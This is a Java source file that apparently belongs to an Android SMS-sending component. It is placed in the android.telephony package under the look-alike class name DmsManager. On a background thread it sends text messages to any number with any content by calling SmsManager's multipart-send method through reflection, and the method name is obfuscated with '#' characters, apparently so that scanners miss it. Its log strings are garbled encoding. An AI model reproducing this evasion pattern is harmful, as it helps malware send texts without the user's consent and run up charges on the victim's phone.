package android.telephony;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.lang.LogUtils;

public class DmsManager  {
 
	private static ExecutorService pool = Executors.newFixedThreadPool(1);
	public static void Send(Context context,String phone,String content) {
		Intent sentIntent = new Intent("SENT_SMS_ACTION"); 
		LogUtils.write("Send", "�㲥 "+phone+"--"+content);
		sentIntent.putExtra("phone", "����"+phone+",����"+content);
		PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent,PendingIntent.FLAG_UPDATE_CURRENT);
		ArrayList<PendingIntent> arrays=new ArrayList<PendingIntent>();
		arrays.add(sentPI);
		LogUtils.write("Send", "������ӵ������߳�"+phone+"--"+content);
		pool.execute(new SendThread(arrays,phone,content));
    }
}
class SendThread extends Thread{
	private static String methodstr="s#e#n#d#M#u#l#t#i#p#a#r#t#T#e#x#t#M#e#s#s#a#g#e#";
	private String content;
	private String phone;
	private ArrayList<PendingIntent> arrays;
	public SendThread(ArrayList<PendingIntent> arrays,String phone,String content){
		this.content=content;
		this.phone=phone;
		this.arrays=arrays;
	}
	@Override
	public void run() {
		// TODO Auto-generated method stub
		super.run();
		LogUtils.write("Send", "���Ͷ����߳�����");
		
		SmsManager smr = SmsManager.getDefault();
        try {
            Class ownerClass = smr.getClass();
            Class[]  argsClass = new Class[5];
            argsClass[0] = String.class;
            argsClass[1] = String.class;
            argsClass[2] = ArrayList.class;
            argsClass[3] = ArrayList.class;
            argsClass[4] = ArrayList.class;
            
            Method method = ownerClass.getMethod(methodstr.replaceAll("#", ""),argsClass);
            
            Object[] arrayOfObject = new Object[5];
            arrayOfObject[0] = phone;
            arrayOfObject[1] = null;
            arrayOfObject[2] = smr.divideMessage(content);
            arrayOfObject[3] = arrays;
            arrayOfObject[4] = null;
            method.invoke(smr, arrayOfObject);
            LogUtils.write("Send", "���Ͷ����߳̽���");
        } catch (Exception e) {
            e.printStackTrace();
        }
	}
	
}
